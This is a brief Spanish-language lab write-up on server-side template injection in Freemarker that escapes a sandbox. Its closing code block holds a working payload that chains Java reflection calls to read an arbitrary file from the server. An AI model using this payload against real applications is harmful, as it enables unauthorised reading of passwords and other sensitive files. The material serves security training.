# SSTI en entorno con sandbox

Tags: #SSTI  #Freemarker 

* [SSTI Freemarker](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Java/#freemarker)
* [Decimal to ASCII](https://www.prepostseo.com/tool/decimal-to-ascii)

```bash 
En este lab se explota una SSTI en Freemarker dentro de un entorno supuestamente aislado. Usamos el objeto 'product' como punto de entrada para encadenar métodos de Java como 'getClass()', 'getProtectionDomain()' y 'openStream()' hasta acceder al archivo sensible '/home/carlos/my_password.txt'.

Obtenemos su contenido como bytes ASCII y lo convertimos para resolver el laboratorio, demostrando que incluso los entornos con sandbox pueden ser vulnerables si no se aíslan correctamente los métodos de reflexión.
```

```bash 
# En este lab la inyección se encuentra en la edición del template del producto 

	${product.getClass()}

# Convertir los bytes que regresa a ASCII
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/user/file.txt').toURL().openStream().readAllBytes()?join(" ")}
```